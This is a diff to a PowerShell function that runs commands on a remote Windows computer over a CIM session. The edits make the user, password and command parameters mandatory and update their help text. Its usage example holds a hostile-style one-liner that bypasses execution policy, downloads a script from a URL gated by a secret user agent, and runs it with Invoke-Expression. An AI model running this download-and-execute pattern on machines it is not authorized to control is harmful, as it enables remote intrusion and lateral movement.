@@ -7,17 +7,17 @@
     This function for example can be used to execute script, also provides output from remote computer.
     
     .PARAMETER User
-    Not mandatory - user of the target machine.    
+    Mandatory - user of the target machine.    
     .PARAMETER Password
-    Not mandatory - pass on target machine.   
+    Mandatory - password on target machine.   
     .PARAMETER Computer
     Mandatory - hostname of remote computer.   
     .PARAMETER Class
-    NotMandatory - choose class.    
+    NotMandatory - choose class, default present, others unimplemented atm.
     .PARAMETER Method
-    Not mandatory - choose class method.   
+    NotMandatory - choose method of a class, for now you can create or terminate a process.
     .PARAMETER ExecuteCommand
-    Not mandatory - execute or terminate your command on a remote computer.
+    Mandatory - execute or terminate your command on a remote computer.
     
     .EXAMPLE
     CIMSessionExecution -User "your_user" -Password "your_pass" -Computer "your_computer_hostname" -ExecuteCommand 'powershell -executionpolicy bypass -Command "Invoke-WebRequest https://path_to_your_script/your_script.ps1 -UserAgent "your_secret" -UseBasicParsing -OutFile $env:TEMP\Script.ps1; & Invoke-Expression $env:TEMP\Script.ps1'
@@ -29,10 +29,10 @@
     #>
     [CmdletBinding()]
     param(
-        [Parameter(Mandatory = $false)]
+        [Parameter(Mandatory = $true)]
         [string]$User,
 
-        [Parameter(Mandatory = $false)]
+        [Parameter(Mandatory = $true)]
         [string]$Password,
  
         [Parameter(Mandatory = $true)]
